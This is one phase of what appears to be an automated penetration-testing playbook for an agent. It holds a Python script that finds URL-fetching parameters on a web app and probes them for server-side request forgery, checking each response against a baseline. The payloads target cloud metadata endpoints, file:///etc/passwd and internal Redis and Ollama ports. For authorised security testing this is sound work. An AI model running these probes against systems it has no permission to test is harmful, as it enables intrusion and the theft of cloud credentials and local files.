**Phase 12 — SSRF (Server-Side Request Forgery)**

  Auto-discover URL-fetching params and test for SSRF. Run as ONE complete block.

  IMPORTANT — BASELINE COMPARISON REQUIRED:
    The app may ignore unknown query params and just return the homepage.
    If you send ?url=http://evil.com and get back the homepage, that's NOT SSRF.
    You MUST compare the SSRF response against a BASELINE (same URL, harmless param value).
    SSRF is confirmed ONLY if the response CHANGES to contain content from the injected URL.
    NEVER guess random param names on the homepage — only test params found in actual forms/crawl.

  ```python
  import time, re
  from urllib.parse import urljoin, urlparse, parse_qs

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  AUTH_FORMS = _G.get('AUTH_FORMS', [])
  ALL_FORMS  = _G.get('ALL_FORMS', [])
  AUTH_PAGES = _G.get('AUTH_PAGES', {})
  ALL_PAGES  = _G.get('ALL_PAGES', {})

  # Keywords indicating a URL-fetching feature (param names)
  SSRF_KEYWORDS = ['url', 'uri', 'fetch', 'load', 'src', 'source',
                   'proxy', 'callback', 'webhook', 'endpoint',
                   'image', 'img', 'avatar', 'preview', 'pdf',
                   'import', 'feed', 'rss']

  SSRF_PATHS = ['/fetch', '/proxy', '/load', '/preview', '/pdf',
                '/api/fetch', '/api/proxy', '/webhook', '/import', '/ssrf',
                '/url', '/curl', '/request', '/image', '/avatar']

  # SSRF test payloads — specific content checks (NOT just len > 100)
  SSRF_PAYLOADS = [
      {'payload': 'http://169.254.169.254/latest/meta-data/', 'check': lambda t: 'ami-id' in t or 'instance' in t, 'label': 'AWS metadata'},
      {'payload': 'http://169.254.169.254/computeMetadata/v1/', 'check': lambda t: 'project' in t, 'label': 'GCP metadata'},
      {'payload': 'file:///etc/passwd', 'check': lambda t: 'root:' in t and '/bin/' in t, 'label': 'local file read'},
      {'payload': 'http://127.0.0.1:11434/api/tags', 'check': lambda t: 'models' in t, 'label': 'internal service (Ollama)'},
      {'payload': 'http://127.0.0.1:6379/', 'check': lambda t: 'redis' in t.lower() or 'ERR' in t, 'label': 'internal Redis'},
  ]

  ssrf_candidates = set()

  # 1. Find URL-accepting params from ACTUAL forms (not guessed)
  for form in AUTH_FORMS + ALL_FORMS:
      for field in form.get('fields', []):
          fname = field.get('name', '').lower()
          if any(kw == fname or kw in fname for kw in SSRF_KEYWORDS):
              action = form.get('action', BASE)
              url = action if action.startswith('http') else urljoin(BASE, action)
              ssrf_candidates.add((url, field.get('name', fname), form.get('method', 'get').lower(), 'form'))

  # 2. Find URL-accepting params from ACTUAL crawled links
  for page_url in list(AUTH_PAGES.keys()) + list(ALL_PAGES.keys()):
      parsed = urlparse(page_url)
      for param, vals in parse_qs(parsed.query).items():
          if any(kw == param.lower() or kw in param.lower() for kw in SSRF_KEYWORDS):
              ssrf_candidates.add((page_url.split('?')[0], param, 'get', 'url_param'))

  # 3. Probe common SSRF paths — only add if endpoint has a REAL form with URL inputs
  for path in SSRF_PATHS:
      endpoint = BASE.rstrip('/') + path
      try:
          r = session.get(endpoint, timeout=6)
          if r.status_code not in (404, 410):
              if 'login' in r.url and 'login' not in endpoint:
                  continue
              from bs4 import BeautifulSoup
              soup = BeautifulSoup(r.text, 'html.parser')
              for form in soup.find_all('form'):
                  for inp in form.find_all(['input', 'textarea']):
                      n = inp.get('name', '')
                      if n:
                          action = form.get('action', '')
                          furl = action if action.startswith('http') else urljoin(endpoint, action or path)
                          method = form.get('method', 'get').lower()
                          ssrf_candidates.add((furl, n, method, 'probed'))
              # DO NOT guess random param names — only test params from actual forms
      except Exception:
          pass

  ssrf_findings = []
  print(f"[SSRF] Testing {len(ssrf_candidates)} candidate params (from forms/crawl only)")

  for (url, param, method, source) in sorted(ssrf_candidates):
      # Step 1: BASELINE — get the normal response with a harmless value
      try:
          if method == 'post':
              r_base = session.post(url, data={param: 'https://example.com/safe_test_12345'}, timeout=10, verify=False)
          else:
              r_base = session.get(url, params={param: 'https://example.com/safe_test_12345'}, timeout=10, verify=False)
      except Exception:
          continue
      baseline = r_base.text

      print(f"  Testing: {method.upper()} {url} param={param} (from {source})")

      for ssrf in SSRF_PAYLOADS:
          time.sleep(0.3)
          try:
              if method == 'post':
                  r = session.post(url, data={param: ssrf['payload']}, timeout=10, verify=False)
              else:
                  r = session.get(url, params={param: ssrf['payload']}, timeout=10, verify=False)
          except Exception:
              continue

          # CRITICAL: Check BOTH that the specific content appears AND that it's NOT in the baseline
          if ssrf['check'](r.text) and not ssrf['check'](baseline):
              print(f"[CRITICAL] SSRF CONFIRMED: {url} param={param}")
              print(f"  Payload: {ssrf['payload']}  ({ssrf['label']})")
              print(f"  Response differs from baseline — contains fetched content")
              print(f"  Evidence: {r.text[:300]}")
              ssrf_findings.append({'url': url, 'param': param, 'payload': ssrf['payload'],
                                    'label': ssrf['label'], 'method': method.upper(),
                                    'evidence': r.text[:500]})
              break

  if ssrf_findings:
      _G.setdefault('FINDINGS', [])
      for sf in ssrf_findings:
          _G['FINDINGS'].append({'severity': 'CRITICAL', 'title': f"SSRF — {sf['label']}", 'url': sf['url'], 'detail': sf})
      print(f"\n[CRITICAL] SSRF found on {len(ssrf_findings)} endpoint(s)!")
  else:
      print("[INFO] No SSRF detected")
  ```
